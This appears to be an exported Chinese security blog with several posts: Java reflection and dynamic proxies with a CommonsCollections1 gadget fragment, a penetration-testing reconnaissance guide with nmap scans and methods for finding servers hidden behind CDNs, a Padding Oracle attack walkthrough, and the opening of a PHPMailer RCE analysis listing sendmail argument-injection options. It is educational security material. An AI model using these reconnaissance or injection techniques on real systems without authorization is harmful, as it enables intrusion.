<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加入某个类的路径</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="keyword">this</span>.getClass()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入目录</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="string">"/usr/local/javalib"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入URL</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> URLClassPath(<span class="string">"www.javassist.org"</span>,<span class="number">80</span>,<span class="string">"/java/"</span>,<span class="string">"org.javassist."</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入类的字节码以及类名</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ByteArrayClassPath(name,b));</span><br></pre></td></tr></table></figure>

<h3 id="获取CtClass对象"><a href="#获取CtClass对象" class="headerlink" title="获取CtClass对象"></a>获取CtClass对象</h3><p>1）使用<font color=#008000>get()</font>函数。可以从Hash表中查找对应的CtClass对象，若未找到则会创建并返回一个新的CtClass对象，将其保存在Hash表中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = pool.get(<span class="string">"test.Rectangle"</span>);</span><br></pre></td></tr></table></figure>

<p>2）使用<font color=#008000>makeClass()</font>函数。它可以返回从给定输入流构造的CtClass对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream ins = an input stream <span class="keyword">for</span> reading a <span class="class"><span class="keyword">class</span> <span class="title">file</span></span>;</span><br><span class="line">CtClass cc = pool.makeClass(ins);</span><br></pre></td></tr></table></figure>

<h2 id="添加代码"><a href="#添加代码" class="headerlink" title="添加代码"></a>添加代码</h2><p>CtConstructor提供了<font color=#008000>insertBefore()</font>、<font color=#008000>insertAfter()</font>、<font color=#008000>addCatch()</font>方法。将Java编写的代码片段插入到现有的方法中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"xx"</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br></pre></td></tr></table></figure>




<h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><p>Class对象可以获得该类里的方法，构造器或者成员变量。</p>
<p>反射用来构造类的方式</p>
<ul>
<li>ClassLoader.loadClass()</li>
<li>Class.forName()</li>
</ul>
<p>获取Class对象的方法</p>
<ul>
<li>Class.forName()</li>
<li>.class</li>
<li>getClass()</li>
</ul>
<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>熟悉Spring的一定知道AOP思想，AOP思想的原理就是Java的动态代理机制。<br>动态代理类主要涉及到两个类: <code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。</p>
<h2 id="InvocationHandler接口"><a href="#InvocationHandler接口" class="headerlink" title="InvocationHandler接口"></a>InvocationHandler接口</h2><p>每一个动态代理类都必须实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler。当通过代理对象调用一个方法时，这个方法的调用就会被转发为由InvocationHandler这个接口的invoke方法来进行调用。在这个invoke方法中编写调用逻辑。</p>
<p>看看这个InvocationHandler接口唯一的方法invoke。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">invoke</span><span class="params">(Object proxy, Method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//Porxy: 被代理的对象</span></span></span><br><span class="line"><span class="function"><span class="comment">//method: 被代理的对象的方法</span></span></span><br><span class="line"><span class="function"><span class="comment">//args: 调用被代理的对象的方法时接受的参数</span></span></span><br></pre></td></tr></table></figure>

<p><strong>举个例子</strong><br>在反序列化过程中，我们会遇到<code>AnnotationInvocationHandler</code>这个类，它实现了InvocationHandler这个类，来看看这个类的invoke方法</p>
<p><img src="1.png" alt=""></p>
<p>和上面的一样，事实上，它实例化出来的对象就是一个handler。</p>
<h2 id="Proxy类"><a href="#Proxy类" class="headerlink" title="Proxy类"></a>Proxy类</h2><p>有了动态代理类，那么如何将需要被代理的对象与这个动态代理类相关联呢？这里就要介绍到Proxy类了。Proxy类的作用是用来动态创建一个代理对象的类，其中用的最多的创建方法是<code>newProxyInstance</code>这个方法。来看看这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</span>  <span class="keyword">throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//loader: 一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理对象进行加载</span></span></span><br><span class="line"><span class="function"><span class="comment">//interfaces: 一个Interface对象的数组，表示给需要代理的对象提供一组接口，从而使得代理对象实现了该接口(多态)，这样就能调用这组接口中的方法</span></span></span><br><span class="line"><span class="function"><span class="comment">//h: 一个InvocationHandler对象，表示当这个动态代理对象在调用方法时，会关联到哪个InvocationHandler对象上</span></span></span><br></pre></td></tr></table></figure>


<p>联想到<a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze-1/" target="_blank" rel="noopener">CommonsCollections1</a>中利用的动态代理机制，可以得知，目的是为了将LazyMap中的接口关联到AnnotationInvocationHandler类实例化的InvocationHandler对象上。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取LazyMap对象的ClassLoader对象</span></span><br><span class="line">Map lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">ClassLoader classloader = lazymap.getClass().getClassLoader();</span><br><span class="line">Class[] interfaces = lazymap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line"><span class="comment">//handler为实例化AnnotationInvocationHandler类的对象</span></span><br><span class="line">Map mapproxy = Proxy.newProxyInstance(classloader,interfaces,handler)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就实现了在调用LazyMap的任何方法，都会转发到AnnotationInvocationHandler的invoke方法。从而实现了动态代理。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.jianshu.com/p/43424242846b" target="_blank" rel="noopener">Javassist 使用指南（一）</a></li>
<li><a href="https://www.jianshu.com/p/b9b3ff0e1bf8" target="_blank" rel="noopener">Javassist 使用指南（二）</a></li>
<li><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">Javassist中文技术文档</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试之信息收集</title>
    <url>/2020/07/20/information-collection/</url>
    <content><![CDATA[<p>在对一个目标进行渗透测试前，最重要的是对其进行信息收集，信息收集的完成度某种程度上决定了后续渗透的成功与否。这篇文章主要是总结一下自己在信息收集过程中用到的一些工具和思路，给自己做个笔记。</p>
<a id="more"></a>

<h1 id="信息收集的流程"><a href="#信息收集的流程" class="headerlink" title="信息收集的流程"></a>信息收集的流程</h1><p>当我们拿到一个目标时，一般是域名信息，根据这个目标，信息收集会做以下的事情，这个流程只是我自己所理解的:</p>
<ul>
<li>子域名收集。</li>
<li>IP信息收集。</li>
<li>服务/端口收集。</li>
<li>端口的指纹收集（包括防火墙(waf)识别）</li>
<li>网站目录结构收集。(敏感信息泄露、路由扫描)</li>
<li>Github源代码收集。</li>
<li>漏洞扫描收集(可选)。</li>
</ul>
<h1 id="1-子域名收集"><a href="#1-子域名收集" class="headerlink" title="1.子域名收集"></a>1.子域名收集</h1><p>针对于一个域名子域名有哪些收集方式呢？先介绍子域名收集工具，一般都会使用子域名工具来收集。</p>
<ul>
<li><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a></li>
</ul>
<h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><p><img src="1.png" alt=""><br>从它的文档中可以看出它涵盖了很多收集子域名的方式。让我们来简单了解各个模块收集子域名的原理。</p>
<h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><p>证书透明度(Certificate Transparency, CT)是一个试验性的IETF开源标准和开源框架，证书颁发机构CA必须将每个SSL或TLS证书发布到公共日志中。SSL和TLS证书通常包含域名、子域名和电子邮件地址。如下入所示</p>
<p><img src="2.png" alt=""></p>
<blockquote>
<p>证书透明CT日志中找到的域/子域可能已经不存在。</p>
</blockquote>
<ul>
<li>分享几个在线证书透明日志搜索:<ul>
<li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li>
<li><a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li>
<li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li>
<li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li>
</ul>
</li>
</ul>
<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>搜索引擎主要是利用各大搜索引擎通过google hacking的手段去收集子域名。<code>site:domain</code></p>
<p><img src="3.png" alt=""></p>
<ul>
<li>Bing搜索引擎</li>
<li>Google搜索引擎</li>
<li>Baidu搜索引擎</li>
</ul>
<h3 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h3><p>准备一个常用子域名字典，然后模拟请求dns服务器，观察子域名是否有成功被解析。它的一个问题是若域名设置了泛解析，那么几乎所有的子域名都能够被解析，造成很多无用子域名数据。</p>
<ul>
<li>DNSPod<a href="https://github.com/DNSPod/oh-my-free-data/blob/master/src/dnspod-top2000-sub-domains.txt" target="_blank" rel="noopener">dnspod-top2000-sub-domains.txt</a></li>
</ul>
<blockquote>
<p>解决方案是将爆破后的子域名+IP结果一起存入结果，检查同一IP对应的子域名，若数量过多(设置阈值)，则判定为无用子域名。构造随机的特殊字符串，若也能解析成功，则说明使用了泛解析。</p>
</blockquote>
<h3 id="DNS数据集"><a href="#DNS数据集" class="headerlink" title="DNS数据集"></a>DNS数据集</h3><p>又称DNS聚合器，聚合了大量DNS数据集。可通过它们来搜索给定域的子域。</p>
<ul>
<li>VirusTotal<ul>
<li>运行自己的被动DNS复制服务，通过存储用户提交的URL解析结果来建立的<a href="https://www.virustotal.com/gui/home" target="_blank" rel="noopener">https://www.virustotal.com/gui/home</a>。<br><img src="4.png" alt=""></li>
</ul>
</li>
</ul>
<ul>
<li>DNSdumpster<ul>
<li>可以挖掘出指定域潜藏的大量子域。<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a><br><img src="5.png" alt="">    </li>
</ul>
</li>
</ul>
<h3 id="常规检查"><a href="#常规检查" class="headerlink" title="常规检查"></a>常规检查</h3><p>常规检查主要是通过http头、域传送漏洞等，主要包括以下内容:</p>
<ul>
<li>HTTP头。(CSP)    </li>
<li>文件泄露。(robots、sitemap、crossdomain.xml)</li>
<li>域传送漏洞。</li>
</ul>
<h3 id="空间搜索引擎"><a href="#空间搜索引擎" class="headerlink" title="空间搜索引擎"></a>空间搜索引擎</h3><p>利用网上一些网络空间搜索引擎来收集子域名。</p>
<ul>
<li><a href="http://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a></li>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></li>
<li><a href="https://censys.io/" target="_blank" rel="noopener">censys</a></li>
<li><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a></li>
<li><a href="https://community.riskiq.com/login" target="_blank" rel="noopener">RiskIQ</a></li>
</ul>
<h1 id="2-IP信息收集"><a href="#2-IP信息收集" class="headerlink" title="2.IP信息收集"></a>2.IP信息收集</h1><p>IP信息收集这块，我把它主要分为2部分。一部分是直接的IP搜集和真实IP的搜集，还有一部分是针对于C段IP信息的收集。</p>
<h2 id="直接的IP收集"><a href="#直接的IP收集" class="headerlink" title="直接的IP收集"></a>直接的IP收集</h2><p>直接的IP收集，在前面的子域名收集中，也会连带着将这部分内容输出。在目标存在CDN的情况下，这种方式搜索到的IP大概率是CDN的IP而不是真实IP，这对于后续利用来说十分有限。但还是介绍几个寻找IP的工具。</p>
<ul>
<li>nslookup<br><img src="6.png" alt=""></li>
<li>dig<br><img src="7.png" alt=""></li>
</ul>
<h2 id="真实IP收集"><a href="#真实IP收集" class="headerlink" title="真实IP收集"></a>真实IP收集</h2><p>为什么要真实的IP，只有拿到了真实的IP，才能进行下一步对真实服务器的端口开放情况进行扫描。如何获取真实的IP呢？</p>
<h3 id="利用子域名"><a href="#利用子域名" class="headerlink" title="利用子域名"></a>利用子域名</h3><p>一般来说对主营业务，访问压力大的域名才会使用CDN，而子域名有可能部署在同一台服务器或者同一个C段，就有可能从中找到真实的IP地址。</p>
<h3 id="历史DNS记录"><a href="#历史DNS记录" class="headerlink" title="历史DNS记录"></a>历史DNS记录</h3><p>通过平台以前收集到的ip与域名绑定的历史记录进行寻找，可能存在以前并未使用CDN的情况。介绍几个历史DNS查询平台。</p>
<ul>
<li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">dnsdb</a></li>
<li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">threatbook</a></li>
</ul>
<h3 id="邮件-RSS订阅"><a href="#邮件-RSS订阅" class="headerlink" title="邮件/RSS订阅"></a>邮件/RSS订阅</h3><p>通过邮件订阅/RSS订阅让目标站主动联系，查看其邮箱服务器的IP，有可能与web服务在一个服务器上。</p>
<h3 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h3><p>国内的CDN往往只对国内的用户，通过国外访问，可能会得到真实的ip地址。介绍一个国外代理网站。</p>
<ul>
<li><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">ping</a></li>
</ul>
<h3 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h3><p>利用censys搜索网站的ssl证书及hash，然后在<a href="https://crt.sh" target="_blank" rel="noopener">crt</a>上查找目标网站SSL证书的hash，然后再用censys搜索该hash即可得到真实的ip地址。</p>
<h3 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h3><p>利用phpinfo、SSRF、XSS等漏洞让目标主动联系。</p>
<h2 id="C段IP信息收集"><a href="#C段IP信息收集" class="headerlink" title="C段IP信息收集"></a>C段IP信息收集</h2><p>这个在实际的渗透测试可能并不是那么必须的，对目标拿到的IP信息比较少，且在已有的目标中没有什么漏洞时，将思路转为子网中的其他服务器。收集的方式很多，fofa等工具，也可以使用nmap这一强大的渗透利器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -O -P0 -oG - 192.168.231.0&#x2F;24 | awk &#39;&#x2F;open&#x2F;&#123;print $2&#125;&#39;</span><br></pre></td></tr></table></figure>

<h1 id="3-服务收集"><a href="#3-服务收集" class="headerlink" title="3.服务收集"></a>3.服务收集</h1><p>服务收集的目的主要是为了查看目标开放的端口服务，然后根据各种端口服务的一些指纹信息再进行进一步的利用。</p>
<p>一般来说，都会使用网络空间搜索引擎(如fofa、shodan之类的)进行查询直接获得结果。本着学习的目的，在这里介绍一下<a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">Nmap</a>这个强大的工具。</p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap有很多种扫描端口的方式，根据不同的场景和限制选择不同的方式。</p>
<p>最简单的方式是不加任何参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.23</span><br><span class="line">nmap 192.168.1.1&#x2F;24  &#x2F;&#x2F;扫描整个子网的端口</span><br><span class="line">nmap 192.168.1.23 192.168.34.243</span><br><span class="line">nmap 192.168.1.1&#x2F;24 -exclude 192.168.1.1</span><br></pre></td></tr></table></figure>

<p>加上<code>-p</code>参数，对指定端口进行扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 192.168.1.23</span><br><span class="line">nmap -p 80,22,21 192.168.1.23</span><br><span class="line">nmap -p 1-65536 192.168.1.23</span><br></pre></td></tr></table></figure>

<p>加入<code>-sV</code>参数，在进行端口扫描时检测服务端软件的版本信息(即指纹信息)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.23 -p 80</span><br></pre></td></tr></table></figure>

<p>加入<code>-O</code>参数，端口扫描时识别目标主机的操作系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.1.23</span><br></pre></td></tr></table></figure>

<p>加入<code>-Pn</code>参数，当目标主机屏蔽了ping请求，Nmap会认为该主机没有开机，选择禁用Nmap的主机检测功能，Nmap就会进行全套的检测工作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn 192.168.1.23</span><br></pre></td></tr></table></figure>

<p>加入<code>-A</code>参数，表示综合扫描，包括OS识别、版本探测和traceroute综合扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.1.23</span><br></pre></td></tr></table></figure>

<p>加入<code>-sP</code>参数，代表Ping扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.1.23-100</span><br></pre></td></tr></table></figure>

<p>加入<code>-sC</code>参数，根据端口识别的服务，调用默认脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC 192.168.1.23 -p 8080</span><br></pre></td></tr></table></figure>

<h3 id="TCP扫描选项"><a href="#TCP扫描选项" class="headerlink" title="TCP扫描选项"></a>TCP扫描选项</h3><ul>
<li>-sT (TCP连接扫描)</li>
<li>-sS (SYN扫描) 隐蔽</li>
<li>-sN (NULL扫描)</li>
<li>-sF (FIN扫描) 隐蔽、漏扫</li>
<li>-sX (XMAS扫描)</li>
<li>-sW (TCP窗口扫描)</li>
<li>-sl (指定僵尸主机发送扫描数据包)</li>
</ul>
<h3 id="UDP扫描选项"><a href="#UDP扫描选项" class="headerlink" title="UDP扫描选项"></a>UDP扫描选项</h3><ul>
<li>-sU</li>
</ul>
<h3 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h3><p>在它的官网中按照类别将脚本进行分类。如下图所示:<br><img src="8.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;address-info www.baidu.com</span><br></pre></td></tr></table></figure>


<p>除了端口扫描外，还具备以下其他功能:</p>
<ul>
<li>主机探测</li>
<li>服务/版本探测</li>
<li>操作系统检测</li>
<li>网络路由跟踪</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -traceroute www.baidu.com</span><br></pre></td></tr></table></figure>

<h1 id="4-端口指纹收集"><a href="#4-端口指纹收集" class="headerlink" title="4.端口指纹收集"></a>4.端口指纹收集</h1><p>这一阶段的任务主要是根据上述的扫描结果，对开放端口的服务、目标主机以及防火墙等信息进行收集识别，便于后续的漏洞利用。在这里分为应用服务指纹识别和防火墙(WAF)指纹识别。</p>
<h2 id="应用指纹收集"><a href="#应用指纹收集" class="headerlink" title="应用指纹收集"></a>应用指纹收集</h2><p>应用指纹信息在使用端口扫描时，能够收集到一些服务的信息。那么这些服务尤其是网站服务是需要进一步地进行CMS指纹识别等应用信息的收集。按照惯例推荐CMS指纹识别工具。</p>
<ul>
<li><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">whatweb</a><br><img src="9.png" alt=""></p>
</li>
<li><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener"></a><br>需要登录后查看。</p>
</li>
</ul>
<h2 id="WAF指纹收集"><a href="#WAF指纹收集" class="headerlink" title="WAF指纹收集"></a>WAF指纹收集</h2><p>WAF指纹收集的收集并不容易，根据响应包的信息，或者是构造特殊的请求，然后查看响应结果。由于本人目前对于企业的一些WAF不太熟悉，这一部分暂缓。</p>
<h1 id="5-网站目录收集"><a href="#5-网站目录收集" class="headerlink" title="5.网站目录收集"></a>5.网站目录收集</h1><p>这一步主要是针对于目标是网站应用时需要做的一步。通过目录信息收集，有可能会找出泄漏的网站源码、配置文件等，但更多的是找出了更多的API接口。在这里同样介绍工具，原理很简单就是根据字典来不断拼接路径，发送请求，然后判断该路径是否存在。</p>
<ul>
<li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a></li>
</ul>
<blockquote>
<p>dirsearch是一个包含丰富字典的目录扫描工具，它的字典大约有6000多个，在限制扫描的网站目标中要慎用。同时它也提供使用者选择自己字典的功能。</p>
</blockquote>
<h1 id="6-Github源码收集"><a href="#6-Github源码收集" class="headerlink" title="6.Github源码收集"></a>6.Github源码收集</h1><p>在收集了网站的一些特征后，比如用到了一个名为xxx.js的文件，可以利用该特征去github上搜索，有可能搜到开发者上传的源码。</p>
<h1 id="7-漏洞扫描-可选"><a href="#7-漏洞扫描-可选" class="headerlink" title="7.漏洞扫描(可选)"></a>7.漏洞扫描(可选)</h1><p>在真实的渗透环境中，大部分的时候都是手工寻找漏洞，在目标网站对于扫描器不敏感的情况下，也可以使用诸如Nessus、AWVS的工具进行一个漏扫。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://anyeduke.gitbooks.io/the-art-of-subdomain-enumeration_zh_cn/content/0x01bei-dong-zi-yu-ming-mei-ju/3shi-yong-dns-ju-he.html" target="_blank" rel="noopener">The art of subdomain enumeration</a></li>
<li><a href="https://xz.aliyun.com/t/6617" target="_blank" rel="noopener">深入了解子域名挖掘tricks</a></li>
<li><a href="https://crayon-xin.github.io/2018/08/12/nmap%E8%B6%85%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">nmap超详细使用指南</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>Padding Oracle的解密以及加密攻击</title>
    <url>/2020/05/08/padding-oracle/</url>
    <content><![CDATA[<p>前面介绍了<a href="https://ananaskr.github.io/2020/05/08/cbc-reverse/" target="_blank" rel="noopener">CBC翻转攻击</a>，从中也了解到了解密过程。而与解密过程中相关的还有一个<font color=#008000>Padding Oracle攻击</font>。Padding Oracle攻击是2010年在欧洲举行的黑帽大会上由Juliano Rizzo和Thai Duong提出的。</p>
<a id="more"></a>

<h1 id="Padding-Oracle获取明文"><a href="#Padding-Oracle获取明文" class="headerlink" title="Padding Oracle获取明文"></a>Padding Oracle获取明文</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
<li>知道密文和IV</li>
<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果。(应用程序对解密正确与否会给出不同的响应)</li>
</ul>
<h2 id="利用点-加密过程中的明文填充"><a href="#利用点-加密过程中的明文填充" class="headerlink" title="利用点-加密过程中的明文填充"></a>利用点-加密过程中的明文填充</h2><p>AES具有<font color=#008000>分组加密</font>的特性。对于明文分块后不足分块大小的。就要进行<font color=#008000>明文填充</font>。其中有种填充方式为<font color=#008000>PKCS5Padding</font>。此种填充方式会在明文块末尾补足相应数量的字节，且每个字节的值等于缺少的字符数量。如下图所示:</p>
<p><img src="1.png" alt=""></p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>如图所示的解密过程:</p>
<p><img src="2.png" alt=""></p>
<p>当攻击者拿到了IV和密文后。可以从图中得知，Intermediary Value即中间值是由明文和IV异或得到的，同时它也就是密文通过密钥解密得到的值。由上面的解密过程中可以得知<code>P[1] = decrept(C[1]) XOR IV</code>。那么得到了中间值，就可以知道明文了。如何获得中间值呢？</p>
<p>从CBC翻转攻击可以知道，IV是可以构造的。通过构造IV，使得解密后的明文最后一个填充字符为0x01，再将构造的IV与001进行异或，就得到了中间值的最后一个字节。我们知道，通过构造不同的IV，可以得到不同的明文，但是其中的中间值是不变的。因此，这个过程可以变成:</p>
<ol>
<li>设置构造IV的值为0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00，将它直接进行解出明文可能出现错误的填充值。然后不断调整最后一个字节，使得其解出的明文最后一个字节的0x01。</li>
<li>这时候构造IV的最后一个字节的值 XOR 0x01就得到了中间值的最后一个字节值。此时将其异或上原始IV的最后一个字节，就获得了明文的最后一个字节。</li>
<li>然后进行明文倒数第二个字节的获得。首先构造的IV需使得明文的最后两个字节为0x02,0x02。倒数第一个字节的IV，此时可以通过中间值最后一个字节 XOR 0x02获得。倒数第二个字节的IV需要像1中那样爆破。</li>
<li>重复以上步骤，直至获取到最后一个明文字节。</li>
</ol>
<h1 id="Padding-Oracle构造密文"><a href="#Padding-Oracle构造密文" class="headerlink" title="Padding Oracle构造密文"></a>Padding Oracle构造密文</h1><p>除了获取明文外，它还可以获得任意明文的加密密文。直观来看，在上一步中已经获取到所有的中间值。首先将明文进行填充，然后与中间值异或就可以得到IV值。然后将第二个分组的明文异或第二个分组的中间值，即得到了第一个分组的密文。那么到这里就会发现最后一个分组的密文无从得知。</p>
<p>有人提出了获得任何明文的密文的方法。从最后两个密文块开始，随机生成最后的密文块。然后每次根据最后一个明文，获取到前一个密文块的密文。依次类推，最后获得密文，过程如图所示:</p>
<p><img src="3.png" alt=""></p>
<p><img src="4.png" alt=""></p>
<p><img src="5.png" alt=""></p>
<blockquote>
<p>图片来自p0’s的博客</p>
</blockquote>
<p>文字版的过程：</p>
<ol>
<li>产生一个随机分组块Cr。</li>
<li>对于每一个明文块，从最后一个明文块开始<ul>
<li>创建两个块大小的密文C’，它由空块(0000…00)以及最新生成的密文块Cn-1组成。首轮由空块和Cr组成。</li>
<li>改变空块的最后一个字节，直到不出现padding error。(此时空块的最后一个字节与后一个块的中间值异或的值为0x01)。还是依照上面的方法获取到后一个块的中间值。</li>
<li>获取到后一个块的中间值以后，就可以利用中间值和明文，构造出前一个块的密文。(P[n] = decrept(C[n]) XOR C[n-1] =&gt; C[n-1] = decrept(C[n]) XOR P[n])。</li>
<li>然后重复整个过程，直到最后第一个明文块的密文获取完毕。</li>
</ul>
</li>
<li>再将所有的密文+Cr连接起来就获取到最终的密文了。</li>
</ol>
<p>整个Padding Oracle的加密过程，就像是先获取到明文，然后使用CBC翻转攻击，使其成为特定的明文，从而构造任意明文的密文。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.jianshu.com/p/1851f778e579" target="_blank" rel="noopener">Padding Oracle</a></li>
<li><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a></li>
<li><a href="https://maplege.github.io/2018/11/10/padding-oracle-attack/" target="_blank" rel="noopener">PaddingOracleAttack原理记录</a></li>
</ul>
]]></content>
      <categories>
        <category>密码攻击</category>
      </categories>
  </entry>
  <entry>
    <title>PHPMailer漏洞总结</title>
    <url>/2020/08/11/phpmailer-vul/</url>
    <content><![CDATA[<p>16年，PHPMailer漏洞爆出了RCE漏洞(CVE-2016-10033)，影响了众多的CMS；在进行修复之后，由于不完善出现了绕过方法(CVE-2016-10045)。17年的时候，又出现了任意文件读取漏洞(CVE-2017-5223)。在PHPMailer小于5.2.23版本时，又出现了XSS漏洞。这篇文章梳理了下PHPMailer的漏洞。</p>
<a id="more"></a>

<h1 id="mail-函数介绍"><a href="#mail-函数介绍" class="headerlink" title="mail()函数介绍"></a>mail()函数介绍</h1><p>在进行具体的漏洞分析之前，先介绍一下mail()函数。mail()函数最后是调用系统的<code>/usr/bin/sendmail</code>命令来发送文件的。漏洞关键点在mail()函数的第5个参数。直接来看看第5个参数的定义。<br><img src="1.png" alt=""><br>该参数可选，且可通过添加附加的命令作为发送邮件时候的配置，如-f参数设置邮件发件人。传入的参数会经过escapeshellcmd()函数过滤以阻止命令执行。整个问题转化为了找到能够绕过过滤并且能利用的命令参数。可查看sendmail MTA手册<a href="http://www.sendmail.org/~ca/email/man/sendmail.html" target="_blank" rel="noopener">http://www.sendmail.org/~ca/email/man/sendmail.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-X logfile &#x2F;&#x2F;将所有的log写入logfile。</span><br><span class="line">-C file  &#x2F;&#x2F;临时加载一个配置文件，可读文件。</span><br><span class="line">-O option&#x3D;value  &#x2F;&#x2F;临时设置一个邮件存储的临时目录的配置。</span><br></pre></td></tr></table></figure>

<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><ul>
<li>影响版本  <ul>
<li>phpmailer &lt; 5.2.20 (CVE-2016-10033 &lt; 5.2.18)</li>
</ul>
</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>然后再来了解一下，PHPMailer的程序调用流程。正常情况下，使用PHPMailer的案例代码如下:</p>
